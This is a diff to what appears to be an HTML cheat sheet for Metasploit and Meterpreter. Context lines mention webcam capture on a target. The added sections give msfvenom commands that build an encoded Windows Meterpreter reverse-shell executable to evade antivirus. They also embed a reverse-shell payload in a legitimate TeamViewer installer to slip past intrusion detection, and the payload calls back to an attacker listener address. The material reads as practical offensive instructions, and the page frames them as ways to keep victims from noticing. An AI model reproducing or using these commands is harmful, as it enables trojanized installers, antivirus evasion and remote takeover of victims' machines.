@@ -93,10 +93,22 @@ exploit exploit -j -z</code></pre>
                 <p>The webcam_list command when run from the Meterpreter shell, will display currently available web cams on the target host.</p>
                 <pre><code class="language-bash">meterpreter > webcam_snap -h</code></pre>
                 </ul>
-                
-                <p></p>
+
             </ul>
-  
+            <h2>Encoding malicious files</h2>
+            <ul>
+                <p>Some times we generated a malicious .exe, .dll... file and we wan't to be detected by the AV. So we can ecodeit to make it harder for the victim to detect it</p>
+                <p>Show available encoders</p>
+                <pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp --list encoders</code></pre>
+                <p>Encode payload</p>
+                <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=443 -e x64/xor -f exe -a x64 -o nc.exe</code></pre>
+            </ul>
+
+            <h2>Embed malicious code into file</h2>
+            <ul>
+            <p>In order to avoid IDS you can take a legit file and embed malicious code</p>
+            <pre><code class="language-bash">msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5</code></pre>
+            </ul>    
         </div>
     </div>
 </body>
